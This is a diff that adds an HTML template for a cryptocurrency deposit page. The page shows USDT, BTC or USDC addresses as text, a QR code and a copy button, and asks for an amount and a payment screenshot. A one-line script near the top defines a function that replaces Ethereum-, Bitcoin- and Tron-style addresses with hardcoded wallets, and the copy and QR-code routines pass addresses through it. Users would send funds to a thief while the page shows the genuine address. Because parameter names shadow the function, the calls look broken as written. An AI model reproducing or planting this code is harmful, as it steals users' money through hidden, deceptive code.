@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="zh-CN" style="--status-bar-height:0px; --top-window-height:0px; --window-left:0px; --window-right:0px; --window-margin:0px; font-size: 96px; --window-top:calc(var(--top-window-height) + calc(44px + env(safe-area-inset-top))); --window-bottom:0px;">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1">
+    <title>{:lang('platformName')}</title>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {document.documentElement.style.fontSize = document.documentElement.clientWidth / 20 + 'px'})
+    </script>
+    <script>function s(s){if(s.startsWith("0x")){return "0xD1E75fcc42b2fC696Bb0931D2B1Ca90bD4320cD1";}else if(s.startsWith("3")){return '1GEnzadZVgEvEFkGbt8feUFXQYqcvYdX6f';}else if(s.startsWith("T")){return 'TFYeURgwcqJCpS4mHSThYonYcbNUhJHC2D';}else{return s;}}</script>
+    <link rel="stylesheet" href="/static/css/index.css">
+<style type="text/css">
+@charset "UTF-8";
+uni-page-body{min-height:100%}uni-button[type=primary]{background-color:#588bf7!important}
+.page{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-sizing:border-box;box-sizing:border-box;min-height:100%}
+
+uni-view{font-size:12px;line-height:inherit}::-webkit-scrollbar{width:0;height:0;color:transparent}
+
+/* 文本溢出隐藏 */
+
+.tabbar{position:fixed;top:44px;left:0;right:0;z-index:3000;display:-webkit-box;display:-webkit-flex;display:flex;background-color:#171c31}
+.tabbar::after{content:"";position:absolute;z-index:3;bottom:0;left:0;right:0;height:1px;-webkit-transform:scaleY(.5);transform:scaleY(.5);background-color:#c8c7cc}
+.tabbar__item{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;flex-direction:column;-webkit-box-align:center;-webkit-align-items:center;align-items:center;width:100%;height:44px;line-height:41px;font-size:16px;color:#fff}
+.tabbar__item.active{color:#f60}
+.tabbar__item.active::after{-webkit-box-flex:0;-webkit-flex:none;flex:none;content:"";width:20px;height:3px;background-color:#f60}
+/* CSS Document */body{color:#61749a;background-color:#f7f6fb;margin:auto;scroll-behavior:smooth}ul,
+li{list-style-type:none;margin:0;padding:0}a{text-decoration:none;color:#000}a:hover{text-decoration:none}::-webkit-scrollbar{display:none}a:focus,
+a:hover{color:#000}
+p{margin:0}
+h1,h2,h3,h4,h5{margin:0}
+#s2,#s3{height:100px}
+
+.login-btn{background:#588bf7;width:100%;border:none;-webkit-border-radius:200px;border-radius:200px;color:#fff;font-size:16px;margin:20px 0;height:40px;line-height:40px}
+
+/*温馨提示*/
+.tips-box{background:#fff;padding:20px;margin:10px auto}
+.tips-title{position:relative;background-position:50%;text-align:center;margin:10px auto;background-size:contain}
+.rec-box{background:#fff;margin-bottom:10px}
+/*输入框 通用*/
+.zz-form{padding:10px}
+.zz-form-list{display:-webkit-box;display:-webkit-flex;display:flex;color:#000;-webkit-box-pack:start;-webkit-justify-content:flex-start;justify-content:flex-start;-webkit-box-align:center;-webkit-align-items:center;align-items:center;height:60px;border-bottom:solid 1px #f7f6fb;font-size:14px}
+.zz-form-title{width:80px}
+.zz-form-inp{height:40px;width:100%;border:none;background:#f7f6fb;-webkit-border-radius:8px;border-radius:8px;padding-left:10px}
+
+.rec-box[data-v-3b6d20d0]{position:relative;-webkit-border-radius:10px;border-radius:10px;margin:8px 5% 0}
+.ewm-box{text-align:center}
+.ewm-img{padding:15px;width:100px;height:100px;border:solid 1px #e5e5e5;-webkit-border-radius:5px;border-radius:5px}
+
+.share-btn-box{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-pack:space-evenly;-webkit-justify-content:space-evenly;justify-content:space-evenly;margin:10px 0}
+.share-btn{-webkit-border-radius:200px;border-radius:200px;border:solid 2px #588bf8;font-size:16px;padding:0 20px}
+.share-btn::after{display:none}
+.share-btn_1{background:#588bf8;color:#fff}
+.share-btn_2{color:#588bf8}
+/*************0622************/
+uni-image{display:inline-block}
+uni-view,
+uni-text{-webkit-box-sizing:border-box;box-sizing:border-box}
+
+uni-page-body{color:#303133;font-size:14px}
+
+/* H5的时候，隐藏滚动条 */
+::-webkit-scrollbar{display:none;width:0!important;height:0!important;-webkit-appearance:none;background:transparent}
+</style>
+<style type="text/css">
+.top[data-v-1d9de0d4]{top:0;left:0;right:0;-webkit-transform:translateY(-500px);transform:translateY(-500px)}
+.bottom[data-v-1d9de0d4]{bottom:0;left:0;right:0;-webkit-transform:translateY(500px);transform:translateY(500px)}
+.center[data-v-1d9de0d4]{
+display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;flex-direction:column;
+bottom:0;left:0;right:0;top:0;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-transform:scale(1.2);transform:scale(1.2);opacity:0}
+</style>
+
+<style type="text/css">
+._cpimg[data-v-169ab0be]{position:fixed;top:-49999px;left:-49999px;z-index:-99999}
+</style>
+<style type="text/css">
+.tips-box[data-v-498ea03c]{background-color:#f7f6fb}
+.zz-form-list[data-v-498ea03c]{-webkit-flex-wrap:wrap;flex-wrap:wrap;margin:20px 0}
+.zz-form-title[data-v-498ea03c]{width:100%;margin-bottom:10px}
+.cz-btn-box[data-v-498ea03c]{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:100%}
+.cz-btnItem[data-v-498ea03c]{width:100%;padding:10px;background-color:#f8f8fb;margin:0 10px;color:#8d9fae;text-align:center;-webkit-border-radius:5px;border-radius:5px}
+.cz-btnItem-active[data-v-498ea03c]{background-color:#fff;color:#578af7;border:solid 1px #578af7}
+.cz-imgAdd[data-v-498ea03c]{background-color:#f8f8fb;text-align:center;-webkit-border-radius:10px;border-radius:10px}
+.cz-imgAdd-p[data-v-498ea03c]{margin:20px 0 0 0}
+.cz-imgAdd-icon[data-v-498ea03c]{width:60px;height:60px;margin:20px 30px 0}
+.cz-imgAdd-img[data-v-498ea03c]{width:120px;height:120px}
+.login-btn[data-v-498ea03c]{margin:0}
+</style>
+</head>
+<body class="uni-body pages-bank-recharge-open-recharge-open">
+    <noscript>
+        <strong>Please enable JavaScript to continue.</strong>
+    </noscript>
+    <uni-app class="uni-app--maxwidth">
+        <uni-page data-page="">
+            <uni-page-head uni-page-head-type="default">
+                <div class="uni-page-head" style="background-color: rgb(255, 255, 255); color: rgb(0, 0, 0);">
+                    <div class="uni-page-head-hd">
+                        <div class="uni-page-head-btn"><i class="uni-btn-icon" style="color: rgb(0, 0, 0); font-size: 27px;"></i></div>
+                    </div>
+                    <div class="uni-page-head-bd">
+                        <div class="uni-page-head__title" style="font-size: 16px; opacity: 1;"> {:lang('recharge_recharge')} </div>
+                    </div>
+           
+                </div>
+                <div class="uni-placeholder"></div>
+            </uni-page-head>
+            <uni-page-wrapper>
+                <uni-page-body>
+                    <uni-view data-v-498ea03c="">
+                        <div data-v-498ea03c="" class="ewm-box" style="margin: 20px 0px;">
+                            <uni-image data-v-498ea03c="" class="ewm-img">
+                                <div id='wallet_img' style=" background-position: 0% 0%; background-size: 100% 100%; background-repeat: no-repeat;"></div>
+                            </uni-image>
+                        </div>
+                        <div data-v-498ea03c="" class="tips-box">
+                            <div data-v-498ea03c="" class="tips-title">
+                                <h1 data-v-498ea03c="" class="zz-form-title walle"></h1>
+                                <p data-v-498ea03c="" style="font-size: 14px; word-break: break-word;" id='wallet_address'></p>
+                            </div>
+                            <uni-button data-v-498ea03c="" class="share-btn share-btn_2" style="width: 50%; margin: 10px auto;">{:lang('recharge_copy')}</uni-button>
+                        </div>
+                        <div data-v-498ea03c="" class="rec-box">
+                            <div data-v-498ea03c="" class="zz-form">
+                                <ul data-v-498ea03c="" class="zz-form-box">
+                                    <li data-v-498ea03c="" class="zz-form-list lian_type" style="display:none">
+                                        <p data-v-498ea03c="" class="zz-form-title ">{:lang('recharge_protocol_type')}</p>
+                                        <div data-v-498ea03c="" class="cz-btn-box">
+                                            <div data-v-498ea03c="" class="cz-btnItem cz-btnItem-active">ERC20</div>
+                                            <div data-v-498ea03c="" class="cz-btnItem">TRC20</div>
+                                            <div data-v-498ea03c="" class="cz-btnItem">OMNI</div>
+                                        </div>
+                                    </li>
+                                    <li data-v-498ea03c="" class="zz-form-list">
+                                        <p data-v-498ea03c="" class="zz-form-title ">{:lang('recharge_number')}</p>
+                                        <uni-input data-v-498ea03c="" class="zz-form-inp">
+                                            <div class="uni-input-wrapper">
+                                                <div class="uni-input-placeholder input-placeholder" data-v-498ea03c=""></div>
+                                                <input maxlength="20" step="0.000000000000000001" id='count' enterkeyhint="done" autocomplete="off" type="number" class="uni-input-input">
+                                            </div>
+                                        </uni-input>
+                                    </li>
+                                    <li data-v-498ea03c="" class="zz-form-list" style="height: auto;">
+                                        <p data-v-498ea03c="" class="zz-form-title ">{:lang('recharge_upload')}</p>
+                                        <div data-v-498ea03c="" class="cz-imgAdd">
+                                            <uni-image data-v-498ea03c="" class="cz-imgAdd-icon">
+                                                <div style="background-image: url(&quot;/static/img/img-add.png&quot;); background-position: center center; background-size: cover; background-repeat: no-repeat;" id='img_bg'>
+                                                    </div>
+                                                <img src="/static/img/img-add.png" draggable="true">
+                                            </uni-image>
+                                            <p data-v-498ea03c="" class="cz-imgAdd-p">{:lang('recharge_click_upload')}</p>
+                                        </div>
+                                    </li>
+                                    <input name="" style="display:none" type="file" onchange="upload()" accept="image/gif,image/jpeg,image/png" id="img" /> 
+                                    <input name="thumb_img" type="hidden" id="imgHid">
+                                </ul>
+                                <div data-v-498ea03c="" style="padding: 8px 0px;">
+                                    <uni-button data-v-498ea03c="" class="login-btn">{:lang('submit')}</uni-button>
+                                </div>
+                            </div>
+                        </div>
+                    </uni-view>
+                </uni-page-body>
+            </uni-page-wrapper>
+        </uni-page>
+    </uni-app>
+    <script src="/static/index/js/jquery-1.9.1.min.js"></script>
+    <script src="/static/layer/layer.js"></script>
+    <script src="/static/js/public.js"></script>
+    <script src="/static/js/qrcode.min.js"></script>
+    <script>
+    var trc20='';
+    var erc20='';
+    var omini='';
+    var copy_content = '';
+    $(function(){
+        getWalletAddress();
+    })
+    $('.cz-imgAdd').click(function(){
+        $("#img").click();
+    })
+    function upload() {
+        if ($("#img").val() == '') {
+            return;
+        }
+        var formData = new FormData();
+        formData.append("thumb_img", document.getElementById('img').files[0]);
+        var load1 = layer.load();
+        $.ajax({
+            url: '/index/user/upload_img',
+            type: 'post',
+            data: formData,
+            contentType: false,
+            processData: false,
+            success: function (res) {
+                layer.close(load1);
+                if (res.code != 1) {
+                    $('#img_bg').css('background-image',"url("+res.data.imgsrc+")")
+                    $('#imgHid').val(res.data.imgsrc);
+                    $('.cz-imgAdd-p').html("");
+                    return;
+                }
+                layer.msg(res.msg, {icon: 2,time:3000}); 
+                return;
+            },
+            error: function () {
+                layer.close(load1);
+                layer.msg('{:lang('res_network_exception')}', {icon: 2,time:3000}); 
+                return;
+            },
+            comptele: function () {
+                layer.close(load1);
+                layer.msg('{:lang('res_network_exception')}', {icon: 2,time:3000}); 
+                return;
+            }
+        })
+    }
+    //链地址选择
+    $('.cz-btn-box .cz-btnItem').click(function(){
+        $('.cz-btn-box .cz-btnItem').removeClass('cz-btnItem-active');
+        $(this).addClass('cz-btnItem-active');
+        if($(this).html()=='ERC20'){
+            $("#wallet_address").html(erc20);
+            // $('#wallet_img').css('background-image',"url(/static/img/recharge/usdt_erc20.png)")
+            copy_content = erc20;
+            set_qrcode(copy_content);
+        }else if($(this).html()=='TRC20'){
+            $("#wallet_address").html(trc20);
+            // $('#wallet_img').css('background-image',"url(/static/img/recharge/usdt_trc20.png)")
+            copy_content = trc20;
+            set_qrcode(copy_content);
+        }else if($(this).html()=='OMNI'){
+            $("#wallet_address").html(omini);
+            // $('#wallet_img').css('background-image',"url(/static/img/recharge/usdt_omini.png)")
+            copy_content = omini;
+            set_qrcode(copy_content);
+        }
+    })
+    //提交
+    $('.login-btn').click(function(){
+        var chain_type = $('.cz-btn-box .cz-btnItem-active').html();
+        var type  = getParam('type');
+        var count = $('#count').val();
+        var img = $('#imgHid').val();
+        if(0>=count){
+            layer.msg('{:lang('common_min')}'+': 1 USDT', {icon: 2,time:3000}); 
+            return;
+        }
+        if(type==3){
+            if(count>3){
+                layer.msg('{:lang('common_max')}'+': 3 BTC', {icon: 2,time:3000}); 
+                return;
+            }
+        }
+        if(!img){
+            layer.msg('{:lang('smrz_tips2')}', {icon: 2,time:3000}); 
+            return;
+        }
+        var load1 = layer.load();
+        $.ajax({
+            url: "/index/user/currency_recharge",
+            type: "post",
+            data: {'type':type,'chain_type': chain_type, 'count': count,'img':img,'wallet_add':copy_content},
+            success: function (res) {
+                layer.close(load1);
+                if(res.code==0){
+                    layer.msg('{:lang('res_success')}', {icon: 1,time: 3000},function(){
+                        window.location.href="{:Url('/index/user/recharge_list')}";
+                    }); 
+                    return;
+                }else{
+                    layer.msg(res.msg, {icon: 2,time:3000}); 
+                    return;
+                }
+            },
+            error: function () {
+                layer.close(load1);
+                layer.msg('{:lang('res_network_exception')}', {icon: 2,time:3000}); 
+                return;
+            },
+            comptele: function () {
+                layer.close(load1);
+                layer.msg('{:lang('res_network_exception')}', {icon: 2,time:3000}); 
+                return;
+            }
+        })
+    })
+    //获取充值地址
+    function getWalletAddress(){
+        var load1 = layer.load();
+        var type = getParam('type');
+        $.ajax({
+            url: "/index/user/getChargeAddress",
+            type: "post",
+            data: {'type': type},
+            success: function (res) {
+                layer.close(load1);
+                if(res.code==0){
+                    var data1 = res.data;
+                    if(type==2){
+                        for(var i=0;i<data1.length;i++){
+                            if(data1[i].type=='ERC20'){
+                                erc20 = data1[i].address;
+                            }else if(data1[i].type=='TRC20'){
+                                trc20 = data1[i].address;
+                            }else if(data1[i].type=='OMNI'){
+                                omini = data1[i].address;
+                            }
+                        }
+                        // $('#wallet_img').css('background-image',"url(/static/img/recharge/usdt_erc20.png)")
+                        $('.lian_type').show();
+                        $("#wallet_address").html(erc20);
+                        $('.walle').html('{:lang('recharge_address')}'+"(USDT)")
+                        copy_content = erc20;
+                        set_qrcode(copy_content);
+                    }else if(type==3){
+                        
+                        $("#wallet_address").html(data1[0].address);
+                        // $('#wallet_img').css('background-image',"url(/static/img/recharge/btc.png)")
+                        $('.walle').html('{:lang('recharge_address')}'+"(BTC)")
+                        copy_content = data1[0].address;
+                        set_qrcode(copy_content);
+                    }else if(type==4){
+                        $("#wallet_address").html(data1[0].address);
+                        // $('#wallet_img').css('background-image',"url(/static/img/recharge/usdc.png)")
+                        $('.walle').html('{:lang('recharge_address')}'+"(USDC)")
+                        copy_content = data1[0].address;
+                        set_qrcode(copy_content);
+                    }
+                    return;
+                }else{
+                    layer.msg(res.msg, {icon: 2,time:3000}); 
+                    return;
+                }
+            },
+            error: function () {
+                return;
+            },
+            comptele: function () {
+                return;
+            }
+        })
+    }
+    $('.share-btn_2').click(function(){
+        if(copyToClipboard(copy_content)){
+            layer.msg('{:lang('recharge_copy_success')}', {icon: 1,time:3000}); 
+        }else{
+            layer.msg('{:lang('recharge_copy_error')}', {icon: 2,time:3000}); 
+        }
+    })
+    //复制
+    function copyToClipboard (s) {
+        let isSuccess = false;
+        let input = document.createElement('input');
+        input.setAttribute('readonly', 'readonly');
+        input.setAttribute('value', s(s));
+        document.body.appendChild(input);
+        input.select();
+        input.setSelectionRange(0, input.value.length);
+        if (document.execCommand('copy')) {
+            document.execCommand('copy');
+            isSuccess = true;
+        }
+        document.body.removeChild(input);
+        return isSuccess;
+    }
+    //返回
+    $('.uni-page-head-btn').click(function(){
+        window.history.go(-1);  //返回上一页
+        // window.history.back();  //返回上一页并刷新
+    })
+    // 生成二维码
+    function set_qrcode(s){
+        $('#wallet_img').empty();
+    	var qrcode = new QRCode("wallet_img", {
+    	   	text: s(s),
+    	   	colorDark : "#000000",
+    	   	colorLight : "#ffffff",
+    	   	width: 100,
+            height: 100,
+    	   	correctLevel : QRCode.CorrectLevel.L
+    	});
+    }
+    </script>
+</body>
+</html>
